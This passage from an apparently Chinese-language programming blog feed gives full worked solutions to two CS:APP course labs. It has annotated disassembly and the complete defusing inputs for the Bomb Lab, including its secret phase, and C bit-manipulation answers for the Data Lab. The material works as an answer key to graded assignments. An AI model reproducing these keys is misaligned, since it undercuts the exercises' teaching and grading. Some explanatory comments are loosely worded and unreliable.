&lt;phase_6+0x20&gt;</span><br><span class="line">  401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi</span><br><span class="line">  401158:	4c 89 f0             	mov    %r14,%rax</span><br><span class="line">  40115b:	b9 07 00 00 00       	mov    $0x7,%ecx</span><br><span class="line">  401160:	89 ca                	mov    %ecx,%edx</span><br><span class="line">  ; 实际上这一段完成的是将输入的每个数字变为 7 - 数字</span><br><span class="line">  401162:	2b 10                	sub    (%rax),%edx</span><br><span class="line">  401164:	89 10                	mov    %edx,(%rax)</span><br><span class="line">  401166:	48 83 c0 04          	add    $0x4,%rax</span><br><span class="line">  40116a:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">  40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line">  40116f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx</span><br><span class="line">  40117a:	83 c0 01             	add    $0x1,%eax</span><br><span class="line">  40117d:	39 c8                	cmp    %ecx,%eax</span><br><span class="line">  40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  401181:	eb 05                	jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx</span><br><span class="line">  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">  40118d:	48 83 c6 04          	add    $0x4,%rsi</span><br><span class="line">  401191:	48 83 fe 18          	cmp    $0x18,%rsi</span><br><span class="line">  401195:	74 14                	je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">  ; 判断是不是小于等于1，是的话就跳转到401183</span><br><span class="line">  40119a:	83 f9 01             	cmp    $0x1,%ecx</span><br><span class="line">  40119d:	7e e4                	jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">  40119f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx</span><br><span class="line">  4011a9:	eb cb                	jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx</span><br><span class="line">  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax</span><br><span class="line">  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:	48 89 d9             	mov    %rbx,%rcx</span><br><span class="line">  4011bd:	48 8b 10             	mov    (%rax),%rdx</span><br><span class="line">  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)</span><br><span class="line">  4011c4:	48 83 c0 08          	add    $0x8,%rax</span><br><span class="line">  4011c8:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">  4011cb:	74 05                	je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">  4011cd:	48 89 d1             	mov    %rdx,%rcx</span><br><span class="line">  ; 上述代码相当于把数字作为偏移量，距离链首指定偏移量后的节点的地址， copy 到另外一个地方</span><br><span class="line">  4011d0:	eb eb                	jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">  4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)</span><br><span class="line">  4011d9:	00 </span><br><span class="line">  4011da:	bd 05 00 00 00       	mov    $0x5,%ebp</span><br><span class="line">  4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax</span><br><span class="line">  4011e3:	8b 00                	mov    (%rax),%eax</span><br><span class="line">  ; 将当前指针指向的元素和上一个指针指向的元素相比</span><br><span class="line">  4011e5:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  4011e7:	7d 05                	jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">  4011e9:	e8 4c 02 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx</span><br><span class="line">  4011f2:	83 ed 01             	sub    $0x1,%ebp</span><br><span class="line">  4011f5:	75 e8                	jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">  4011f7:	48 83 c4 50          	add    $0x50,%rsp</span><br><span class="line">  4011fb:	5b                   	pop    %rbx</span><br><span class="line">  4011fc:	5d                   	pop    %rbp</span><br><span class="line">  4011fd:	41 5c                	pop    %r12</span><br><span class="line">  4011ff:	41 5d                	pop    %r13</span><br><span class="line">  401201:	41 5e                	pop    %r14</span><br><span class="line">  401203:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>因此通关<code>payload</code>：<code>4 3 2 1 6 5</code></p>
<p>最终完整通关<code>payload</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 207</span><br><span class="line">7 0</span><br><span class="line">9?&gt;567</span><br><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>

<h2 id="隐藏关卡"><a href="#隐藏关卡" class="headerlink" title="隐藏关卡"></a>隐藏关卡</h2><p>竟然还有隐藏关卡，大意了大意了,当时压根没想到。查看<code>bomb.c</code>文件，我们发现每个<code>phase</code>结束后，都会调用<code>phase_defused</code>这个函数，结合<code>bomb.s</code>文件，在这个函数中先是判断输入的字符串个数是不是6，是的话再继续判断<code>0x603870</code>指向的内容中，前两个是否是数字且第三个字符串是不是<code>DrEvil</code>，是的话即可进入隐藏关卡，因此我们要在第四关输入的字符串后面加上<code>DrEvil</code>，然后第6关结束后，自动进入隐藏关卡。</p>
<p><code>secret_phase</code>函数如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:	53                   	push   %rbx</span><br><span class="line">  401243:	e8 56 02 00 00       	call   40149e &lt;read_line&gt;</span><br><span class="line">  ; 将字符串解析成10进制数字</span><br><span class="line">  401248:	ba 0a 00 00 00       	mov    $0xa,%edx</span><br><span class="line">  40124d:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401252:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  401255:	e8 76 f9 ff ff       	call   400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  ; 返回值给rbx</span><br><span class="line">  40125a:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">  ; 我们输入的数字减一后如果大于0x3e8，就explode_bomb</span><br><span class="line">  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax</span><br><span class="line">  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax</span><br><span class="line">  401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:	e8 ce 01 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  ; 实际上输入的第一个数字作为fun7的第二个参数</span><br><span class="line">  40126c:	89 de                	mov    %ebx,%esi</span><br><span class="line">  ; 将0x6030f0作为fun7的第一个参数，该地址对应的内容是0x24h</span><br><span class="line">  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi</span><br><span class="line">  401273:	e8 8c ff ff ff       	call   401204 &lt;fun7&gt;</span><br><span class="line">  ; 返回值得是2</span><br><span class="line">  401278:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:	e8 b8 01 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:	bf 38 24 40 00       	mov    $0x402438,%edi</span><br><span class="line">  401287:	e8 84 f8 ff ff       	call   400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:	e8 33 03 00 00       	call   4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:	5b                   	pop    %rbx</span><br><span class="line">  401292:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>我们来看fun7函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401208:	48 85 ff             	test   %rdi,%rdi</span><br><span class="line">  ; 如果第一个参数是0，则跳转401238，实际上是返回0xffffffff</span><br><span class="line">  40120b:	74 2b                	je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  ; 获取第一个参数指向的内容（最开始调用的时候，该值是0x24h）</span><br><span class="line">  40120d:	8b 17                	mov    (%rdi),%edx</span><br><span class="line">  ; 上面获取到的与传进来的第二个参数（最开始调用时候，该值是我们输入的第一个数字）相比，</span><br><span class="line">  ; 如果大于等于第二个参数，则跳转401220</span><br><span class="line">  40120f:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401211:	7e 0d                	jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi</span><br><span class="line">  401217:	e8 e8 ff ff ff       	call   401204 &lt;fun7&gt;</span><br><span class="line">  40121c:	01 c0                	add    %eax,%eax</span><br><span class="line">  40121e:	eb 1d                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401225:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401227:	74 14                	je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi</span><br><span class="line">  40122d:	e8 d2 ff ff ff       	call   401204 &lt;fun7&gt;</span><br><span class="line">  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401236:	eb 05                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  ; 返回0xffffffff</span><br><span class="line">  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax</span><br><span class="line">  40123d:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401241:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>上面的代码大致等效于</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fun7(<span class="keyword">int</span> *rdi, <span class="keyword">int</span> rsi)&#123;</span><br><span class="line">    <span class="keyword">if</span>(rdi == <span class="number">0</span>)<span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">if</span>(*rdi &lt;= rsi)&#123;</span><br><span class="line">        <span class="keyword">if</span>(*rdi == rsi)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            rdi = *(rdi + <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * fun7(rdi, rsi) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        rdi = *(rdi + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * fun7(rdi, rsi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单分析一下，如果我们不理会<code>return 0xffffffff;</code>这个分支，我们很快就会发现，函数只会有三种分支，一个是0，另一个是递归后乘以2再加1，最后一个是递归后乘以2.</p>
<p>为了使得最终返回2，我们可以使得上一次递归返回值是1，以<code>2*f</code>的方式返回。</p>
<p>为了使得上一次递归返回值是1，我们可以使得上上一次递归返回值是0.以<code>2*f+1</code>的方式返回。</p>
<p>关键是如何使得上上一次递归返回值是0.</p>
<p>我们先看一下<code>0x6030f0</code>开始的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x6030f0 &lt;n1&gt;:      0x0024  0x0000  0x0000  0x0000  0x3110  0x0060  0x0000  0x0000</span><br><span class="line">0x603100 &lt;n1+16&gt;:   0x3130  0x0060  0x0000  0x0000  0x0000  0x0000  0x0000  0x0000</span><br><span class="line">0x603110 &lt;n21&gt;:     0x0008  0x0000  0x0000  0x0000  0x3190  0x0060  0x0000  0x0000</span><br><span class="line">0x603120 &lt;n21+16&gt;:  0x3150  0x0060  0x0000  0x0000  0x0000  0x0000  0x0000  0x0000</span><br><span class="line">0x603130 &lt;n22&gt;:     0x0032  0x0000  0x0000  0x0000  0x3170  0x0060  0x0000  0x0000</span><br><span class="line">0x603140 &lt;n22+16&gt;:  0x31b0  0x0060  0x0000  0x0000  0x0000  0x0000  0x0000  0x0000</span><br><span class="line">0x603150 &lt;n32&gt;:     0x0016  0x0000  0x0000  0x0000  0x3270  0x0060  0x0000  0x0000</span><br></pre></td></tr></table></figure>

<p>假设一开始我们输入的数字是x，我们来看一下调用栈</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f(0x6030f0,x)</span><br><span class="line">  |-- 0                    : if x &#x3D;&#x3D; 0x24h</span><br><span class="line">  |-- 2 * f(0x603130,x) + 1: if x &gt; 0x24h</span><br><span class="line">  |-- 2 * f(0x603110,x)    : if x &lt; 0x24h</span><br><span class="line">我们要走f(0x603110,x)这个分支</span><br><span class="line">f(0x603110,x)</span><br><span class="line">  |-- 0                    : if x &#x3D;&#x3D; 0x8h</span><br><span class="line">  |-- 2 * f(0x603150,x) + 1: if x &gt; 0x8h</span><br><span class="line">  |-- 2 * f(0x603190,x)    : if x &lt; 0x8h</span><br><span class="line">我们要走f(0x603150,x)这个分支</span><br><span class="line">f(0x603150,x)</span><br><span class="line">  |-- 0                    : if x &#x3D;&#x3D; 0x16h</span><br><span class="line">  |-- 2 * f(0x603230,x) + 1: if x &gt; 0x16h</span><br><span class="line">  |-- 2 * f(0x603270,x)    : if x &lt; 0x16h</span><br><span class="line">因此我们只要满足x &#x3D;&#x3D; 0x16h即可</span><br></pre></td></tr></table></figure>

<p>最终完整payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 207</span><br><span class="line">7 0 DrEvil</span><br><span class="line">9?&gt;567</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">22</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>阅读汇编实际上难度不大，难的是如何将汇编代码反推其逻辑功能，如果是C语言代码，一般可以通过变量名称或者代码结构反推逻辑功能，但是来到了汇编代码层，就困难得多了。</p>
<p>分析汇编过程动静结合的方式尤为重要，对于新手，不建议直接用IDA，因为实际上这些可视化反汇编软件存在一些错误，这些可能给新手带来很多困惑。</p>
<p>强烈推荐安装<code>pwbdbg</code></p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP-Data Lab</title>
    <url>/2023/07/31/CS-APP-Data-Lab/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本实验分为两部分，第一部分要求我们使用给定的操作符完成相应的功能，第二部分是完成IEEE浮点数运算的仿真。</p>
<h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><p>描述：实现抑或运算</p>
<p>可用操作：~ &amp;</p>
<p>最大操作量：14</p>
<p>真值表：<a id="more"></a></p>
<table>
<thead>
<tr>
<th>x</th>
<th>y</th>
<th>x⊕y</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>德·摩根定律：<code>a∨b=~(~a∧~b)</code></td>
<td></td>
<td></td>
</tr>
<tr>
<td><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x⊕y	&#x3D; (x&amp;~y)|(~x&amp;y)</span><br><span class="line">	 &#x3D; ~(~(x&amp;~y)&amp;~(~x&amp;y))</span><br></pre></td></tr></table></figure></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~(x &amp; ~y) &amp; ~(~x &amp; y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><p>描述：返回最小的二进制补码整数</p>
<p>可用操作：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
<p>最大操作量：4</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h2><p>描述：判断是否为二进制最大补码数</p>
<p>可用操作：! ~ &amp; ^ | +</p>
<p>最大操作量：10</p>
<p>实际上最大的补码数是<code>0x7fffffff</code>，但是无法直接写<code>0x7fffffff</code></p>
<p>我们还注意到上数求反后是最小的补码数，而且补码性质：最大补码数绝对值比最小补码数绝对值小1，因此我们可以根据这个条件判断，我们先将该数字求反，再根据绝对值判断，当然这个过程中也要排除-1的存在</p>
<blockquote>
<p>判断x是不是y，可以通过抑或进行：!(x^y)，因为抑或的性质是相同为0，相异为1,而取非是只有结果是0的时候才输出1，非0情况输出0</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = ~x;</span><br><span class="line">    <span class="comment">// 如果 x 是 -1，那么 !(y ^ (x + 1)) 也是 1，因此要排除</span></span><br><span class="line">  <span class="keyword">return</span> !(y ^ (x + <span class="number">1</span>))  &amp; !!(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h2><p>描述：指定数字的所有的奇数位是否为1.</p>
<p>可用操作：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
<p>最大操作量：12</p>
<p>我们可以先获取奇数位置上的数字，同时我们不关心偶数位置上面的数字，因此我们先将其与<code>0xaaaaaaaa</code>按位与，如果得到的结果是<code>0xaaaaaaaa</code>那说明是满足条件的，重要的步骤是如何构造<code>0xaa</code>了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> AAAAAAAA = (<span class="number">0xaa</span> &lt;&lt; <span class="number">24</span>) + (<span class="number">0xaa</span> &lt;&lt; <span class="number">16</span>) + (<span class="number">0xaa</span> &lt;&lt; <span class="number">8</span>) + <span class="number">0xaa</span>;</span><br><span class="line">    <span class="keyword">return</span> !((x &amp; AAAAAAAA) ^ AAAAAAAA);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><p>描述：求指定数字的负数.</p>
<p>可用操作符：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
<p>最大操作数目：5</p>
<p>回顾一下一个数字的补码怎么表示？对于正数，补码就是其本身，负数的补码是求反加一，因此我们可以把这个取相反数看作求补码即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="isAsciDigit"><a href="#isAsciDigit" class="headerlink" title="isAsciDigit"></a>isAsciDigit</h2><p>描述：判断指定数字是否大于等于<code>0x30</code>而小于等于<code>0x39</code>。</p>
<p>可用操作符：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
<p>最大操作数目：15</p>
<p>首先这个数字必须满足前面28位是<code>0x0000003</code></p>
<p>因此我们先构造出 <code>0xfffffff0</code>,再和待测数字按位与，得到的记为A，A如果与<code>0x00000030</code>相等则第一个条件满足（通过异或）</p>
<p>第二条件是最低的4位是<code>0000~1001</code>,因此：</p>
<ul>
<li>要么倒数第4位是0</li>
<li>要么中间两个数字是0</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  	<span class="keyword">int</span> FFFFFFF0 = (<span class="number">0xff</span> &lt;&lt; <span class="number">24</span>) + (<span class="number">0xff</span> &lt;&lt; <span class="number">16</span>) + (<span class="number">0xff</span> &lt;&lt; <span class="number">8</span>) + <span class="number">0xf0</span>;</span><br><span class="line">	<span class="keyword">return</span> !((x &amp; FFFFFFF0) ^ <span class="number">0x30</span>) &amp; ( !(x  &amp; <span class="number">0x8</span>) | !(x  &amp; <span class="number">0x6</span>) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h2><p>类似于<code>x ? y : z</code></p>
<p>可用操作符：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
<p>最大操作数目：16</p>
<p>不能用<code>if</code>语句，我们可以类似<code>if</code>语句 的逻辑，根据<code>x</code>的值返回，实际上我们可以同时将y和z作为运算，但是为了能够只返回其中之一，我们需要将某一个屏蔽，至于屏蔽哪个，则根据x的值来</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果 x 是0，则 flag = 00...00</span></span><br><span class="line">    <span class="comment">// 如果 x 非0，则 flag = 11...11</span></span><br><span class="line">    <span class="keyword">int</span> notZeroFlag = ~(!(!x)) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (notZeroFlag &amp; y) | (~notZeroFlag &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h2><p>判断是否x&lt;=y</p>
<p>可用操作符：! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
<p>最大操作数目：24</p>
<p>如果x=y，那么可以直接返回1；</p>
<p>最好的办法是先进行相减，但是在本题中，减法被禁用了。</p>
<p>回顾一下，计算机中，减法实际上是通过补码相加完成的，因此<code>x-y</code>可以使用<code>x+(-y)</code>进行表示。</p>
<p>完成减法后，我们可以根据减法结果进行判断，如果结果的最高位是0，则说明是结果正数，即x&gt;y，应该返回0。当然 通过该方法的前提是不能够溢出，对于减法，异号相减才会有可能溢出，同号相减是不可能溢出的，因此我们可以先判断是否异号，如果异号，则根据哪个是正数哪个是负数来判断。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> equal = !(x ^ y);</span><br><span class="line">    <span class="keyword">int</span> res = x + (~y + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> f1 = (x &amp; (<span class="number">0x80</span> &lt;&lt; <span class="number">24</span>)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> f2 = (y &amp; (<span class="number">0x80</span> &lt;&lt; <span class="number">24</span>)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> equalFlag = !(f1 ^ f2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> resNegFlag = (res &amp; (<span class="number">0x80</span> &lt;&lt; <span class="number">24</span>)) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">return</span> equal | (!equalFlag &amp; (f1 | !f2)) | (equalFlag &amp; resNegFlag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h2><p>实现逻辑非“!”</p>
<p>如果待测数字是0，则输出1，否则输出0.</p>
<p>可用操作符：~ &amp; ^ | + &lt;&lt; &gt;&gt;</p>
<p>最大操作数目：12</p>
<p>我们要知道只有 0 和 最小负数（0x80000000）的相反数等于本身，并且除了这两个数字，任何数字和自己的相反数按位与或，必然是全1，而0和最小的负数在于符号位不同，因此我们可以借助该性质。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> flag = x | (~x + <span class="number">1</span>);</span><br><span class="line">		<span class="comment">// 如果x不是0，也不是最小负数，那么flag是全1，往右移31后还是全1（有符号移位），因此加1后是0</span></span><br><span class="line">    	<span class="comment">// 如果x是最小负数，即10000....,那么往右移31后还是全1（有符号移位），因此加1后是0</span></span><br><span class="line">    	<span class="comment">// 如果x是0，往右移31后还是全0，因此加1后是1</span></span><br><span class="line">    	<span class="keyword">return</span> (flag &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h2><p>描述：判断<code>x</code>需要多少为补码表示</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">howManyBits(12) &#x3D; 5</span><br><span class="line">howManyBits(298) &#x3D; 10</span><br><span class="line">howManyBits(-5) &#x3D; 4</span><br><span class="line">howManyBits(0)  &#x3D; 1</span><br><span class="line">howManyBits(-1) &#x3D; 1</span><br><span class="line">howManyBits(0x80000000) &#x3D; 32</span><br></pre></td></tr></table></figure>

<p>可用操作：<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></p>
<p>操作符上限：90</p>
<p>实际上题目说的不太清楚，对于除了全0和全1的数字，我们返回其二进制表示中除去前导零后剩余的位数再加1（符号位），对于负数，我们可以将其取反，当成正数来处理，例如，12d=1100b，返回5，298d=100101010b,返回10，对于0，我们以”0”表示，对于全1：<code>111...111</code>，我们直接使用”1”表示，对于1，我们使用“01”表示</p>
<p>我们先快速判断右边（即低位）有多少有效位，我们可以通过寻找最左边的1来获取右边的有效位，如果没有任何限制，我们可以从左到右循环判断，但是如此一来总的操作数肯定会超限 ，因为极端情况下左边是连续很多个0。</p>
<p>实际上我们可以使用二分的方法，我们每次判断高的半部分是否有1，如果有，则右半部分都是有效位，然后缩小区间，继续判断。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> negFlag,bit16,bit8,bit4,bit2,bit1,bit0;</span><br><span class="line">    <span class="comment">// 如果 x 是正数，则 negFlag = 00...00</span></span><br><span class="line">    <span class="comment">// 如果 x 是负数，则 negFlag = 11...11</span></span><br><span class="line">    negFlag = (x &amp; (<span class="number">0x80</span> &lt;&lt; <span class="number">24</span>) )&gt;&gt; <span class="number">31</span>;</span><br><span class="line">    x = (~negFlag &amp; x) | (negFlag &amp; (~x));</span><br><span class="line">    <span class="comment">// 如果高的16位（最右边是最低）中有1，则低16位都是有效位，因此 bit16 = 16</span></span><br><span class="line">    <span class="comment">// 否则，如果没有，则 bit16 = 0</span></span><br><span class="line">    bit16 = (!(!(x &gt;&gt; <span class="number">16</span>)) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">    <span class="comment">// 如果高16位中有1，低16位则丢弃，因为我们关心的是高16位中1的位置在哪里</span></span><br><span class="line">    <span class="comment">// 否则，x不变（我们继续判断低16位中的高8位）</span></span><br><span class="line">    x = x &gt;&gt; bit16;</span><br><span class="line"></span><br><span class="line">    bit8 = (!(!(x &gt;&gt; <span class="number">8</span>)) &lt;&lt; <span class="number">3</span>);</span><br><span class="line">    x = x &gt;&gt; bit8;</span><br><span class="line"></span><br><span class="line">    bit4 = (!(!(x &gt;&gt; <span class="number">4</span>)) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    x = x &gt;&gt; bit4;</span><br><span class="line"></span><br><span class="line">    bit2 = (!(!(x &gt;&gt; <span class="number">2</span>)) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    x = x &gt;&gt; bit2;</span><br><span class="line"></span><br><span class="line">    bit1 = (!(!(x &gt;&gt; <span class="number">1</span>)) &lt;&lt; <span class="number">0</span>);</span><br><span class="line">    x = x &gt;&gt; bit1;</span><br><span class="line"></span><br><span class="line">    bit0 = !(!(x));</span><br><span class="line">    <span class="keyword">return</span> bit16 + bit8 + bit4 + bit2 + bit1 + bit0 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

